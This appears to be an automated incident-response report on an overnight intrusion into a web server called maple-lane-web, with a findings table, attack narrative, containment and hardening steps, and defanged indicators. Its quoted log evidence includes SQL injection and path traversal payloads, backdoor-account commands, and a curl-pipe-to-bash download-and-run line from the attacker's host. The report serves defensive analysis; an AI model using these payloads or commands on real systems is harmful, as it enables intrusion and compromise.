# Investigation: maple-lane-last-night.txt

107 lines · 2026-10-05T00:58:11Z to 2026-10-05T01:21:09Z · 13 findings (2 critical, 5 high, 5 medium, 1 low) · analysed on this machine by PrismOS + qwen3.8:27b

## Findings
| Severity | Finding | ATT&CK | Evidence |
|---|---|---|---|
| 🟥 critical | SQL injection attempts, answered with 200 | T1190 | 203.0.113[.]47 - - [05/Oct/2026:01:03:12 +0000] "GET /products?id=1'%20OR%20'1'='1 HTTP/1.1" 200 8821 "-" "sqlmap/1.7-dev" |
| 🟥 critical | Login succeeded from a source that was guessing passwords | T1078 | Oct  5 01:13:58 maple-lane-web sshd[21777]: Accepted password for deploy from 203.0.113[.]47 port 41999 ssh2 |
| 🟧 high | Path traversal attempts | T1190 | 203.0.113[.]47 - - [05/Oct/2026:01:03:30 +0000] "GET /order?file=../../../../etc/passwd HTTP/1.1" 403 153 "-" "sqlmap/1.7-dev" |
| 🟧 high | New account created | T1136 | Oct  5 01:14:40 maple-lane-web sudo:   deploy : TTY=pts/0 ; PWD=/h**** ; USER=root ; COMMAND=/usr/sbin/useradd -m -s /bin/bash svc-backup |
| 🟧 high | SQL injection attempts | T1190 | 203.0.113[.]47 - - [05/Oct/2026:01:03:11 +0000] "GET /products?id=1%20UNION%20SELECT%20username,password%20FROM%20users HTTP/1.1" 500 512 "-" "sqlmap/1.7-dev" |
| 🟧 high | Account added to an admin group | T1098 | Oct  5 01:14:55 maple-lane-web sudo:   deploy : TTY=pts/0 ; PWD=/h**** ; USER=root ; COMMAND=/usr/sbin/usermod -aG sudo svc-backup |
| 🟧 high | Download-and-run command | T1105 | Oct  5 01:15:20 maple-lane-web sudo:   deploy : TTY=pts/0 ; PWD=/h**** ; USER=root ; COMMAND=/bin/sh -c curl -fsSL hxxp://203.0.113[.]47/x/update.sh / bash |
| 🟨 medium | Password guessing from 203.0.113[.]47 | T1110.001 | Oct  5 01:05:01 maple-lane-web sshd[20001]: Failed password for invalid user admin from 203.0.113[.]47 port 40001 ssh2 |
| 🟨 medium | Vulnerability scanner traffic | T1595 | 203.0.113[.]47 - - [05/Oct/2026:01:02:03 +0000] "GET /.env HTTP/1.1" 404 153 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine)" |
| 🟨 medium | Probes for sensitive files and admin panels | T1190 | 203.0.113[.]47 - - [05/Oct/2026:01:02:03 +0000] "GET /.env HTTP/1.1" 404 153 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine)" |
| 🟨 medium | Scheduled task or cron change | T1053 | Oct  5 01:15:40 maple-lane-web crontab[22044]: (deploy) REPLACE (deploy) |
| 🟨 medium | Program run from a temp folder | T1204 | Oct  5 01:16:03 maple-lane-web sudo:   deploy : TTY=pts/0 ; PWD=/h**** ; USER=root ; COMMAND=/bin/chmod +x /tmp/.cache/update |
| 🟦 low | Commands run with sudo | T1548.003 | Oct  5 01:14:40 maple-lane-web sudo:   deploy : TTY=pts/0 ; PWD=/h**** ; USER=root ; COMMAND=/usr/sbin/useradd -m -s /bin/bash svc-backup |

### What happened
Between 01:02Z and 01:16Z on October 5, 2026, the IP address 203.0.113[.]47 launched a targeted attack against `maple-lane-web`. The attacker first scanned for vulnerabilities, then successfully exploited a SQL injection vulnerability in the `/products` endpoint at 01:03Z. Shortly after, they brute-forced the `deploy` account via SSH, gaining access at 01:13Z. Once inside, the attacker created a new user `svc-backup`, granted it sudo privileges, and downloaded a suspicious script from 203.0.113[.]47 at 01:15Z. Finally, they established persistence by modifying the cron table and executing a file from `/tmp/.cache/update`.

### Severity and scope
This is a **critical** incident with a high likelihood of data exfiltration. The `deploy` account is compromised, and the creation of a new sudo-enabled account suggests persistent access. The SQL injection response (200 OK) indicates potential access to the database containing user credentials or order data. The scope includes the web server `maple-lane-web`, the `deploy` account, and the newly created `svc-backup` account. We are highly confident in the compromise based on successful logins and privileged command execution.

### Contain now
1. **Isolate `maple-lane-web`**: Disconnect it from the network immediately to stop data exfiltration and lateral movement.
2. **Disable compromised accounts**: Suspend the `deploy` and `svc-backup` accounts immediately.
3. **Block the attacker IP**: Add 203.0.113[.]47 to your firewall block list to prevent further intrusion attempts.
4. **Preserve evidence**: Take a forensic image of the system disk before rebooting or making changes.

### Eradicate and recover
1. **Rebuild the server**: Do not trust the current OS. Rebuild `maple-lane-web` from a known-good image.
2. **Patch vulnerabilities**: Fix the SQL injection bug in the `/products` endpoint by using parameterized queries.
3. **Rotate secrets**: Change all passwords, API keys, and database credentials associated with `maple-lane-web` and any integrated services.
4. **Review logs**: Check other servers for connections from 203.0.113[.]47 or logins using the `deploy` credentials.

### Harden so it doesn't happen again
1. **Disable password auth for SSH**: Use key-based authentication only and restrict SSH access to specific IPs if possible.
2. **Implement WAF**: Deploy a Web Application Firewall to filter out SQL injection and path traversal attacks.
3. **Least Privilege**: Ensure the `deploy` account does not have sudo rights. Use dedicated service accounts with minimal permissions.
4. **Monitor and Alert**: Set up alerts for new user creation, sudo usage, and failed login spikes.

### What to collect next
*   **Database logs**: Review queries executed around 01:03Z to determine what data was accessed or exfiltrated.
*   **File integrity**: Compare file hashes against a baseline to identify any modified system binaries.
*   **Outbound connections**: Review netstat or proxy logs for connections to 203.0.113[.]47 or other unknown domains during the incident window.
*   **Open questions**: Did the SQL injection query leak any PII? Was the `update.sh` script a reverse shell or cryptominer?

## Indicators (defanged)
- **Public IPs** (3): `198.51.100[.]23`, `203.0.113[.]47`, `198.51.100[.]76`
- **URLs** (2): `hxxp://203.0.113[.]47/x/update.sh`, `hxxps://maple-lane-bakery.example/menu`
- **Users** (3): `admin`, `deploy`, `root`
- **Paths** (1): `/tmp/.cache/update`